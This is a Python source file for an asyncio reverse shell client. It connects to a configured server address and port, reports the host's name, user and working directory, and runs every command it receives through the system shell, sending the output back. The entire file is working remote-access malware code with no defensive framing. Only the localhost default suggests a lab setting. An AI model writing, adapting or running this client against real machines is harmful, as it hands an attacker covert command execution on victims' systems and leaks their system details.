import asyncio
import json
import os
import struct
from asyncio import CancelledError
from pathlib import Path
from sysInfo import TargetSysInfo

# Configuration: Server address and port for the reverse shell connection
SERVER_HOST = '127.0.0.1'
SERVER_PORT = 1234


class ReverseShellClient:
    """
    Reverse shell client that connects to a server and executes shell commands remotely.
    """

    def __init__(self):
        self.reader = None
        self.writer = None
        self.current_directory = os.getcwd()
        self.clientinfo = TargetSysInfo()

    def setup_data(self, stdout: str, stderr: str = '', dtype: str = '') -> bytes:
        data = {
            'stdout': stdout,
            'stderr': stderr,
            'type': dtype,
            'cwd': self.clientinfo.cwd,
            'hostname': self.clientinfo.hostname,
            'username': self.clientinfo.username
        }
        return json.dumps(data, indent=4).encode()

    async def run_process(self,command):
        # Execute shell command asynchronously
        process = await asyncio.create_subprocess_shell(
            command,
            stdin=asyncio.subprocess.PIPE,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE,
            cwd=Path.cwd()
        )

        output, stderr = await asyncio.create_task(process.communicate())  # await process.communicate()

        # Send the output back to the server
        await self.send_output(
            self.setup_data(stdout=output.decode().strip(), stderr=stderr.decode().strip()))

    async def send_output(self, data: bytes):
        """
        Sends command output back to the server.
        """
        length = struct.pack(">I", len(data))
        self.writer.write(length + data)
        await self.writer.drain()

    def resolve_path(self, path: str) -> str:
        """
        Resolves the path to an absolute path, handling user home (~) and empty input.
        """
        if not path:
            return str(Path.home())
        if path.startswith('~'):
            return str(Path(path).expanduser())
        return str(Path(path).absolute())

    async def connect_and_listen(self):
        """
        Connects to the reverse shell server and listens for commands to execute.
        """
        try:
            self.reader, self.writer = await asyncio.open_connection(SERVER_HOST, SERVER_PORT)
            print(f"[+] Connected to reverse shell server at {SERVER_HOST}:{SERVER_PORT}")
            await self.send_output(self.setup_data(stdout=self.clientinfo.__str__()).strip())

            while True:
                # Receive a command from the server
                data = await self.reader.read(1024)
                if not data:
                    print(f"[-] Connection closed by {SERVER_HOST}:{SERVER_PORT}")
                    self.writer.close()
                    await self.writer.wait_closed()
                    break
                command = data.decode().strip()

                if command == "sysinfo":
                    await self.send_output(self.setup_data(stdout=self.clientinfo.__str__()))
                    continue

                try:
                    # Handle change directory (cd) command
                    if command.startswith("cd ") or command == "cd":
                        print('[-] Changing directory. Before:', os.getcwd())
                        os.chdir(self.resolve_path(command[3:]))
                        self.current_directory = os.getcwd()
                        response = f"[+] Changed directory to: {self.current_directory}"
                        print('[+] After:', os.getcwd())
                        await self.send_output(self.setup_data(stdout=response))
                        continue

                    print(f"[>] Executing command: {command} (Current directory: {os.getcwd()})")
                    asyncio.create_task(self.run_process(command))

                except FileNotFoundError:
                    await self.send_output(
                        self.setup_data(stdout='', stderr=f"[-] No such file or directory: {command}"))
                except NotADirectoryError:
                    await self.send_output(self.setup_data(stdout='', stderr=f"[-] Not a directory: {command}"))
                except PermissionError:
                    await self.send_output(self.setup_data(stdout='', stderr=f"[-] Permission denied: {command}"))
        except CancelledError:
            print("[-] Interrupted by user. Closing connection.")
            # do something
        except ConnectionRefusedError as e:
            print("[-] Connection failed: Server refused the connection. Verify IP, port, and server status.")
            # do something
        except ConnectionResetError as e:
            print(e)


async def main():
    """
    Entry point for the asynchronous reverse shell client.
    """
    client = ReverseShellClient()
    await client.connect_and_listen()


# Start the async event loop
asyncio.run(main())
